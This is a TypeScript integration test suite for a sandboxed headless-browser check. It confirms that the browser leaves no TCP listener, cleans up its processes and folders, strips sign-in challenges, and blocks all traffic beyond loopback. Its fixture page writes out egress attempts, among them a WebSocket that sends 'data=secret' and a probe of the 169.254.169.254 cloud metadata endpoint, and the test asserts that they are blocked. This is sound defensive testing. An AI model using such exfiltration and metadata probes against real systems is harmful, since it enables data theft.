// The browser check on the real pinned runtime (M81 A1, PLAN.md D49): the
// Chrome-for-Testing headless shell the runtime store installed and
// verified, the owned proxy, the canaries and the audit, all real. The
// fixture page on 127.0.0.1 with its console error and failed request; the
// pipe and no TCP listener; the check's folder removed; no browser process
// left after a deadline or a stop; a sign-in challenge that never reaches
// the page; and every way out beyond loopback blocked, counted by a server
// on this machine's own address (the widened check shows it can count).
// Runs where MUSE_TEST_BROWSER_STORAGE names a storage folder holding the
// installed runtime (the rigs; docs/certification/m81.md); skipped
// elsewhere, saying why in its name. No model is called.
import { existsSync, readFileSync } from 'node:fs'
import { createServer, type IncomingMessage, type ServerResponse } from 'node:http'
import { createServer as createTcpServer } from 'node:net'
import { afterAll, beforeAll, describe, expect, it, vi } from 'vitest'
import {
  type BrowserCheckRequest,
  type BrowserCheckResult,
  type BrowserHostOptions,
  type BrowserRunDeps,
  runBrowserCheck,
} from '../../src/core/browser/browserRun'
import { hostBrowserRunDeps } from '../../src/host/browser/browserProcess'
import manifest from '../../src/host/browser/runtime/browserRuntime.json'
import { prepareRuntime } from '../../src/host/browser/runtime/runtimeStore'
import { processesNaming, tcpListenersOf } from './helpers/browserProcesses'
import { LiveServers, OWN_ADDRESS } from './helpers/liveBrowser'

const STORAGE = process.env['MUSE_TEST_BROWSER_STORAGE']
const SUITE =
  STORAGE === undefined
    ? 'the browser check on the pinned runtime (skipped: MUSE_TEST_BROWSER_STORAGE names no installed runtime here)'
    : 'the browser check on the pinned runtime'
// This machine's own address on its network: a page must never reach it.
const OUTSIDE_ADDRESS = OWN_ADDRESS
const FIXTURE = readFileSync(new URL('../fixtures/browser-check.html', import.meta.url), 'utf8')
const LIVE_TIMEOUT_MS = 120_000
const SLOW_MS = 4000
const GONE_WAIT_MS = 15_000
const DEADLINE_MS = 12_000
const STOP_AFTER_MS = 10_000

const live = {
  page: '',
  pagePort: '',
  outside: '',
  outsidePort: '',
  outsideConnections: 0,
  authorizations: 0,
}
const servers = new LiveServers()

function html(response: ServerResponse, body: string): void {
  response.writeHead(200, { 'content-type': 'text/html' }).end(body)
}

function script(response: ServerResponse, body: string): void {
  response.writeHead(200, { 'content-type': 'text/javascript' }).end(body)
}

/** A page that tries every way out to the outside server; its load waits on a slow image. */
function escapePage(): string {
  const outside = live.outside
  return `<!doctype html><title>escape</title>
<link rel="preconnect" href="http://${outside}/">
<img src="http://${outside}/img.png">
<iframe src="http://localhost:${live.pagePort}/frame"></iframe>
<img src="/slow">
<script>
fetch('http://${outside}/fetch').catch(() => {})
fetch('/redirect').catch(() => {})
fetch('http://169.254.169.254/latest/meta-data/').catch(() => {})
try { new WebSocket('ws://${outside}/ws?data=secret') } catch {}
new Worker('/worker.js')
navigator.serviceWorker && navigator.serviceWorker.register('/sw.js').catch(() => {})
</script>`
}

function serve(request: IncomingMessage, response: ServerResponse): void {
  if (request.headers.authorization !== undefined) {
    live.authorizations += 1
  }
  const outside = live.outside
  switch (request.url) {
    case '/': {
      html(response, FIXTURE)
      return
    }
    case '/favicon.ico': {
      response.writeHead(204).end()
      return
    }
    case '/slow': {
      setTimeout(() => {
        response.writeHead(204).end()
      }, SLOW_MS)
      return
    }
    case '/hang': {
      return
    }
    case '/escape': {
      html(response, escapePage())
      return
    }
    case '/frame': {
      html(response, `<script>fetch('http://${outside}/fromframe').catch(() => {})</script>`)
      return
    }
    case '/worker.js': {
      script(
        response,
        `fetch('http://${outside}/fromworker').catch(() => {}); try { new WebSocket('ws://${outside}/fromworker-ws') } catch {}`,
      )
      return
    }
    case '/sw.js': {
      script(
        response,
        `self.addEventListener('install', (e) => e.waitUntil(fetch('http://${outside}/fromsw').catch(() => {})))`,
      )
      return
    }
    case '/redirect': {
      response.writeHead(302, { location: `http://${outside}/redirected` }).end()
      return
    }
    case '/widen': {
      html(response, `<img src="http://${outside}/widened.png">`)
      return
    }
    case '/signin': {
      html(
        response,
        `<script>fetch('/protected', { credentials: 'include' }).then((r) => console.error('signin ' + r.status + ' ' + (r.headers.get('www-authenticate') ?? 'none')))</script><img src="/slow">`,
      )
      return
    }
    case '/protected': {
      response
        .writeHead(401, [
          'WWW-Authenticate',
          'Negotiate',
          'WWW-Authenticate',
          'NTLM',
          'Content-Length',
          '0',
        ])
        .end()
      return
    }
    default: {
      response.writeHead(404).end()
    }
  }
}

interface Watched {
  root?: string
  args?: readonly string[]
  probe?: Promise<{ readonly pids: readonly number[]; readonly listeners: readonly string[] }>
  readonly isProbed?: boolean
}

/** The browser's processes and listeners, read while it still runs. */
async function probeBrowser(root: string) {
  let pids: number[] = []
  await vi.waitFor(
    async () => {
      pids = await processesNaming(root)
      expect(pids.length).toBeGreaterThan(0)
    },
    { timeout: GONE_WAIT_MS, interval: 200 },
  )
  const listeners = await tcpListenersOf(pids)
  const named = await processesNaming(root)
  expect(named.length).toBeGreaterThan(0)
  return { pids, listeners }
}

function liveDeps(watched: Watched, checkMs?: number): BrowserRunDeps {
  const base = hostBrowserRunDeps({
    platform: process.platform,
    env: process.env,
    warn: () => undefined,
  })
  return {
    ...base,
    createFolder: async (storageDir) => {
      const folder = await base.createFolder(storageDir)
      watched.root = folder.root
      return folder
    },
    spawn: (executable, args, env) => {
      watched.args = args
      const browser = base.spawn(executable, args, env)
      if (watched.isProbed === true) {
        watched.probe = probeBrowser(watched.root ?? '')
      }
      return browser
    },
    ...(checkMs !== undefined && { timings: { checkMs } }),
  }
}

function options(): BrowserHostOptions {
  return {
    storageDir: STORAGE ?? '',
    prepareRuntime: async (prepare) =>
      await prepareRuntime(
        { ...prepare, consent: () => Promise.resolve('decline') },
        {
          platform: process.platform,
          arch: process.arch,
          now: () => Date.now(),
          fetch: () => Promise.reject(new Error('the live suite downloads nothing')),
          manifest,
        },
      ),
    admissionSignal: new AbortController().signal,
    admissionStillValid: () => true,
    warn: () => undefined,
  }
}

function request(url: string, overrides: Partial<BrowserCheckRequest> = {}): BrowserCheckRequest {
  return {
    url,
    actions: [],
    allowedHosts: [],
    approvalKey: url,
    includeScreenshot: false,
    signal: new AbortController().signal,
    ...overrides,
  }
}

async function check(
  watched: Watched,
  url: string,
  overrides: Partial<BrowserCheckRequest> = {},
  checkMs?: number,
): Promise<BrowserCheckResult> {
  return await runBrowserCheck(liveDeps(watched, checkMs), request(url, overrides), options())
}

async function expectGone(watched: Watched): Promise<void> {
  const root = watched.root ?? ''
  expect(root).not.toBe('')
  await vi.waitFor(
    async () => {
      expect(await processesNaming(root)).toEqual([])
    },
    { timeout: GONE_WAIT_MS, interval: 250 },
  )
  expect(existsSync(root)).toBe(false)
}

function report(result: BrowserCheckResult) {
  if (!result.ok) {
    throw new Error(`the check failed: ${JSON.stringify(result.failure)}`)
  }
  return result.report
}

describe.skipIf(STORAGE === undefined)(SUITE, () => {
  beforeAll(async () => {
    live.pagePort = String(await servers.listen(createServer(serve), '127.0.0.1'))
    live.page = `127.0.0.1:${live.pagePort}`
    if (OUTSIDE_ADDRESS === undefined) {
      return
    }
    const counter = createTcpServer((socket) => {
      live.outsideConnections += 1
      socket.end('HTTP/1.1 200 OK\r\ncontent-length: 6\r\n\r\nsecret')
    })
    live.outsidePort = String(await servers.listen(counter, OUTSIDE_ADDRESS))
    live.outside = `${OUTSIDE_ADDRESS}:${live.outsidePort}`
  })

  afterAll(async () => {
    await servers.closeAll()
  })

  it(
    'reads back the fixture page: its console error, its failed request, the steps and a screenshot',
    async () => {
      const watched: Watched = {}
      const found = report(
        await check(watched, `http://${live.page}/`, {
          includeScreenshot: true,
          actions: [
            { kind: 'type', selector: '#name', text: 'Ada' },
            { kind: 'click', selector: '#go' },
          ],
        }),
      )
      expect(found.consoleErrors.shown).toEqual(
        expect.arrayContaining(['fixture console error 7', 'clicked with Ada']),
      )
      expect(found.failedRequests.shown).toEqual([`http://${live.page}/missing.json (HTTP 404)`])
      expect(found.finalUrl).toBe(`http://${live.page}/`)
      expect(found.screenshot?.width).toBeGreaterThan(0)
      await expectGone(watched)
    },
    LIVE_TIMEOUT_MS,
  )

  it(
    'talks over the pipe with no TCP listener, in a fresh folder under the extension’s storage it removes',
    async () => {
      const watched: Watched = { isProbed: true }
      expect(await check(watched, `http://${live.page}/escape`)).toMatchObject({ ok: true })
      expect(watched.args).toContain('--remote-debugging-pipe')
      expect(watched.args?.filter((arg) => arg.includes('remote-debugging-port'))).toEqual([])
      expect(watched.root?.startsWith(STORAGE ?? '-')).toBe(true)
      const probe = await watched.probe
      expect(probe?.pids.length).toBeGreaterThan(0)
      expect(probe?.listeners).toEqual([])
      await expectGone(watched)
    },
    LIVE_TIMEOUT_MS,
  )

  it(
    'strips a sign-in challenge before the page sees it, and no credential reaches the server',
    async () => {
      const before = live.authorizations
      const found = report(await check({}, `http://${live.page}/signin`))
      expect(found.consoleErrors.shown).toEqual(['signin 401 none'])
      expect(live.authorizations - before).toBe(0)
    },
    LIVE_TIMEOUT_MS,
  )

  it.skipIf(OUTSIDE_ADDRESS === undefined)(
    'reaches a host only once it is widened for the check',
    async () => {
      const before = live.outsideConnections
      const found = report(
        await check({}, `http://${live.page}/widen`, { allowedHosts: [OUTSIDE_ADDRESS ?? ''] }),
      )
      expect(found.failedRequests.shown).toEqual([])
      expect(live.outsideConnections - before).toBeGreaterThan(0)
    },
    LIVE_TIMEOUT_MS,
  )

  it.skipIf(OUTSIDE_ADDRESS === undefined)(
    'lets nothing reach beyond loopback: subresources, redirects, frames, workers, sockets, link-local',
    async () => {
      const before = live.outsideConnections
      const found = report(await check({}, `http://${live.page}/escape`))
      expect(live.outsideConnections - before).toBe(0)
      const outside = live.outside
      expect(found.blockedRequests.shown).toEqual(
        expect.arrayContaining([
          `http://${outside}/img.png`,
          `http://${outside}/fetch`,
          `http://${outside}/fromframe`,
          `ws://${outside}/ws?data=secret`,
          'http://169.254.169.254/latest/meta-data/',
        ]),
      )
    },
    LIVE_TIMEOUT_MS,
  )

  it(
    'kills the browser at its deadline and when stopped, leaving no process and no folder',
    async () => {
      const late: Watched = {}
      expect(await check(late, `http://${live.page}/hang`, {}, DEADLINE_MS)).toEqual({
        ok: false,
        failure: { kind: 'timedOut' },
      })
      await expectGone(late)

      const stopped: Watched = {}
      const cancelled = await check(stopped, `http://${live.page}/hang`, {
        signal: AbortSignal.timeout(STOP_AFTER_MS),
      })
      expect(cancelled).toEqual({ ok: false, failure: { kind: 'cancelled' } })
      await expectGone(stopped)
    },
    LIVE_TIMEOUT_MS,
  )
})
